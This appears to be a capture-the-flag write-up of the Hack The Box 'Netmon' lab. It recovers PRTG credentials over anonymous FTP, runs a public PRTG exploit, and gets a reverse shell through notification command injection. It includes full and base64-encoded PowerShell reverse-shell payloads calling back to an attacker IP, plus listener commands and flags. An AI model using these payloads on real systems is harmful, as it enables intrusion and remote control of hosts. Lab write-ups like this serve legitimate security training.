


# NMAP 

![[Pasted image 20251212014605.png]]

* it shows FTP on port 21 can be accessed anonymously. 
* port 80 is hosting a website too: 


![[Pasted image 20251212014754.png]]


# PLAN A:

Access FTP anonymous and check configs of the website - hunt for creds

### Creds was found in C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak

```powershell

	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
	      
	      
```


# Try the password on the website:

-   `PrTg@dmin2018` fails but   `PrTg@dmin2019` works. 


# Failed Attempts

```powershell

# Failed: 
evil-winrm -i '10.129.230.176' -u 'prtgadmin' -p 'PrTg@dmin2018' 

# Failed

nxc smb 10.129.230.176 -u 'prtgadmin' -p 'PrTg@dmin2018'  --shares
```


# Search for  known exploits

![[Pasted image 20251211222519.png]]



# Fix the exploit according to the provided instructions:

```powershell
# get the cookie values after authenticating to the webserver:
./46527.sh -u http://10.129.230.176 -c "_ga=GA1.4.964298405.1765506597; _gid=GA1.4.218903026.1765506597; OCTOPUS1813713946=ezg4REI1NTJDLUU5OEUtNEFEOS1BQjVDLUVBNzE1NEYxMUExMX0%3D; _gat=1"
```


# Run the exploit

It creates a new nt authority user with creds: `pentest:P3nT3st!`

Since nmap showed port 5985 is open, we can use the creds and evil-winrm to connect:

![[Pasted image 20251211223916.png]]

# Get the flags: 

![[Pasted image 20251212010801.png]]


# Flags:

```powershell
User Flag: d511a46fbcd22123abb216d3ed4f7276
Root Flag: 3501c6d1d7d741f0248b341b3251197c
```
# TODO

- FTP enum
- Exploit notification system + nishang
- xclip 




==========================

# Alternative Priv Esc route:

Go to notifications:

![[Pasted image 20251212020539.png]]

![[Pasted image 20251212020631.png]]

![[Pasted image 20251212023211.png]]




**Ping works:**

![[Pasted image 20251212021305.png]]

So let's use Nishang powershell script to get a reverse shell:



```powershell 
nishang # /usr/share/nishang
cd Shells #  # /usr/share/nishang/Shells

cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ~/HTB/Netmon

echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.158 -Port 1337" >> Invoke-PowerShellTcp.ps1

#verify 
tail Invoke-PowerShellTcp.ps1

# convert to UTF-16LE to remove bad characters and encode to base64 in one line (w0)
cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
# iconv -t converts text to  UTF-16LE commonly used by windows
# -w0 means “write with 0 line-wrap” 
# (i.e., produce one long continuous line; no newline every 76 chars)

# set up python server and a netcat listener
rlwrap nc -nvlp 1337 
python -m http.server


test | powershell -enc ZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACQAXwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAeAAgAD0AIAAoACQAZQByAHIAbwByAFsAMABdACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQByAHIAbwByAC4AYwBsAGUAYQByACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAIAAkAHgACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAUgBlAHQAdQByAG4AIAB0AGgAZQAgAHIAZQBzAHUAbAB0AHMACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAgACAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIAIAAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgAH0ACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA0AC4AMQA1ADgAIAAtAFAAbwByAHQAIAAxADMAMwA3AAoA
```

# And we get a shell:

![[Pasted image 20251212030225.png]]


# Alternative payloads:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

```powershell

test; "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


# Easiest payload:

The script can be downloaded from:
https://github.com/LeonardoE95/yt-en/blob/main/src/2024-07-10-windows-privesc-windows-reverse-shells/content/code/base64_powershell.py


```powershell

cd ~/Tools/Scripts/base64_powershell.py

#Step 1: set up the listener
rlwrap nc -nlvp 1337

#Step 2: execute the script to generate the payload:
python3 base64_powershell.py <attackerIP> <ListenerPort>

#Step 3: copy the generated output and execute it on a powershell session (10.6.15.192 1337)
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgAuADEANQAuADEAOQAyACIALAAgADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

# For our case:

test | powershell -nop -w hidden -e JABjAGwAaQBlAG4A...<snip>...
```